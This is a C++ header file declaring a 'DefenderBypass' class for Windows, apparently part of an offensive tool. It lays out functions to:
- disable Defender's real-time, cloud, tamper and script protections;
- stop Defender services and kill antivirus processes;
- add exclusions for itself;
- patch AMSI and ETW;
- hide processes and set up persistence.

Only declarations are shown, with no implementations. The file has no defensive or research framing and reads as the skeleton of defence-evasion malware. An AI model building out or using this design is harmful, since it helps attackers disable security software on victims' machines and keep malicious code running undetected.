#ifndef DEFENDER_BYPASS_H
#define DEFENDER_BYPASS_H

#include <windows.h>
#include <string>
#include <vector>
#include <map>
#include <thread>
#include <atomic>

class DefenderBypass {
public:
    DefenderBypass();
    ~DefenderBypass();

    // Main disable functions
    bool DisableAllProtections();
    bool EnableAllProtections();
    bool IsDefenderActive();

    // Specific components
    bool DisableRealTimeProtection();
    bool DisableCloudProtection();
    bool DisableBehaviorMonitoring();
    bool DisableTamperProtection();
    bool DisableAutomaticSampleSubmission();
    bool DisableScriptScanning();
    
    // Registry methods
    bool DisableDefenderRegistry();
    bool EnableDefenderRegistry();
    
    // Service methods
    bool StopDefenderServices();
    bool StartDefenderServices();
    
    // Exclusion methods
    bool AddExclusion(const std::string& path);
    bool AddExclusionProcess(const std::string& process_name);
    bool RemoveExclusion(const std::string& path);
    bool AddSelfExclusion();
    
    // Advanced evasion
    bool BypassAMSI(const std::string& script);
    bool DisableSmartScreen();
    bool DisableWindowsSecurityCenter();
    bool KillDefenderProcesses();
    
    // NEW: Add these declarations
    bool AddDefenderExclusion();           // Add this
    bool BypassAMSI();                     // Add this (overload without parameters)
    bool KillAntivirusProcesses();         // Add this
    
    // Persistence
    bool CreateDefenderBypassPersistence();
    bool RemoveDefenderBypassPersistence();
    
    // Monitoring
    bool MonitorDefenderStatus();
    bool RestoreDefenderAfterExit();

    // Public helper methods
    bool IsAdmin();
    bool PatchETW();

private:
    // Registry operations
    bool SetRegistryValue(HKEY hKey, const std::string& subKey, 
                         const std::string& valueName, DWORD value);
    bool SetRegistryString(HKEY hKey, const std::string& subKey,
                          const std::string& valueName, const std::string& value);
    bool DeleteRegistryValue(HKEY hKey, const std::string& subKey, 
                            const std::string& valueName);
    bool IsRegistryValueSet(HKEY hKey, const std::string& subKey,
                           const std::string& valueName);
    
    // Service operations
    bool ControlService(const std::string& serviceName, DWORD controlCode);
    bool IsServiceRunning(const std::string& serviceName);
    bool SetServiceStartType(const std::string& serviceName, DWORD startType);
    bool StartService(const std::string& serviceName);
    
    // Process operations
    bool TerminateProcessByName(const std::string& processName);
    bool SuspendProcessByName(const std::string& processName);
    bool IsProcessRunning(const std::string& processName);
    bool HideProcess(const std::string& processName);
    
    // AMSI bypass
    bool PatchAMSI();
    bool RestoreAMSI();
    
    // ETW bypass
    bool RestoreETW();
    
    // Enable functions (for restoration)
    bool EnableRealTimeProtection();
    bool EnableTamperProtection();
    
    // Original values for restoration
    std::map<std::string, DWORD> original_registry_values;
    std::vector<std::string> modified_registry_keys;
    std::vector<std::string> original_service_states;
    std::vector<std::string> defender_exclusions;
    
    // State tracking
    std::atomic<bool> is_bypass_active;
    std::thread monitoring_thread;
    
    // Configuration
    struct DefenderConfig {
        bool disable_realtime;
        bool disable_cloud;
        bool disable_behavior;
        bool disable_tamper;
        bool disable_amsi;
        bool disable_etw;
        bool add_exclusion;
    } config;
    
    // Helper methods
    bool ElevatePrivileges();
    bool AdjustTokenPrivileges();
    void CreateRestoreScript();
    void CleanupOnExit();
    bool EnablePrivilege(const wchar_t* privilege);
    
    mutable CRITICAL_SECTION cs;
};

#endif // DEFENDER_BYPASS_H
